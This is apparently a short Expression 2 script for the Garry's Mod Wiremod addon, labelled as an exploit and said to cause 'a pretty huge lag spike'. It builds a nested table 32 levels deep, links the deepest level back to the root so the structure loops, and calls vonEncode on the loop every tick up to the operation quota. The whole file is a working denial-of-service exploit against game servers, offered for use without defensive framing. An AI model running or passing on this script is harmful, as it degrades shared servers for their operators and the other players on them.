@name exploits/vicious_cycle
@persist [Root,Branch]:table Depth Quota Main:function
@persist MAX_DEPTH

# by Fasteroid
# causes a pretty huge lag spike

if( first() ){
    
    Quota     = softQuota()
    
    MAX_DEPTH = 32
    D         = 0
    Root      = table()
    Branch    = Root
    
    print("loading")
    
    Main = function(){
        if( D < MAX_DEPTH ){
            local New = table()
            Branch[1,table] = New
            Branch = New
            D++
        }
        else {
            Branch[1,table] = Root
            print("executing")
            Main = function(){
                vonEncode(Root)
            }
        }
    }
    
    
}

event tick(){
    while( opcounter() < Quota ){
        Main()
    }
}


